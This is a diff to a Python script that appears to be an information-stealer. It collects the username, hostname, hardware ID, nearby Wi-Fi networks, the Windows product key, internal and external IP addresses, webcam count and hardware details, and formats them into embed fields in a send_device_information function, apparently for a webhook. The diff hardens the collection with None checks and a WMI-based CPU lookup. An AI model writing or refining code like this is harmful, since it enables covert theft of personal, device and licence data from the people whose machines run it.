@@ -1,6 +1,6 @@
 import os
+import wmi
 import subprocess
-import cpuinfo
 import GPUtil
 import sys
 import psutil
@@ -52,22 +52,23 @@ def format_drive_info(drives):
 pygame.camera.init()
 username = str(os.getenv("USERNAME"))
 hostname = str(os.environ['COMPUTERNAME'])
-hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip()
-decoded_hwid = str(hwid.decode("utf-8"))
-wifi = pywifi.PyWiFi()
-iface = wifi.interfaces()[0]
-iface.scan()
-scan_results = iface.scan_results()
-for result in scan_results:
-    ssid = result.ssid
-    bssid = result.bssid
+hwid = str(subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode("utf-8"))
+iface = pywifi.PyWiFi().interfaces()[0] if pywifi.PyWiFi().interfaces() is not None else None
+if iface is not None:
+    iface.scan()
+    for result in iface.scan_results():
+        ssid = result.ssid
+        bssid = result.bssid
+else:
+    ssid = "No result"
+    bssid = "No result"
 lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
 system = str(subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1])
 output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
 product_key = str(output.split('\n', 1)[-1].strip())
 ram = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
-power = str(psutil.sensors_battery().percent)
-screen = str(pyautogui.size())
+power = str(psutil.sensors_battery().percent) + "%" if psutil.sensors_battery() is not None else "No battery"
+screen = f"{pyautogui.size()[0]}x{pyautogui.size()[1]}"
 webcams_count = len(pygame.camera.list_cameras())
 internal_ip = str(socket.gethostbyname(socket.gethostname()))
 external_ip = str(requests.get('https://api.ipify.org').text)
@@ -75,8 +76,8 @@ gpus = GPUtil.getGPUs()
 gpu_info = str("")
 for gpu in gpus:
     gpu_info += f"GPU Name: {gpu.name} - GPU Driver: {gpu.driver} - GPU Memory Total: {gpu.memoryTotal}MB - GPU Memory Free: {gpu.memoryFree}MB - GPU Memory Used: {gpu.memoryUsed}MB"
-info = cpuinfo.get_cpu_info()
-cpu_info = str(f"CPU Name: {info['brand_raw']} - CPU Architecture: {info['arch']} - CPU Cores: {info['count']}")
+info = wmi.WMI().Win32_Processor()[0]
+cpu_info = str(f"Name: {info.Name} - Arch: x{info.AddressWidth} - Cores: {info.NumberOfCores}")
 current_execution_path = str(os.path.join(os.getcwd(), sys.argv[0]))
 drives = get_drive_info()
 drive_info_string = str(format_drive_info(drives))
@@ -116,7 +117,7 @@ def send_device_information():
             {
                 "name": "HWID",
                 "value":
-                    f"`{decoded_hwid}`",
+                    f"`{hwid}`",
                 "inline": False,
             },
             {
@@ -158,7 +159,7 @@ def send_device_information():
             {
                 "name": "Power",
                 "value":
-                    f"`{power}%`",
+                    f"`{power}`",
                 "inline": False,
             },
             {
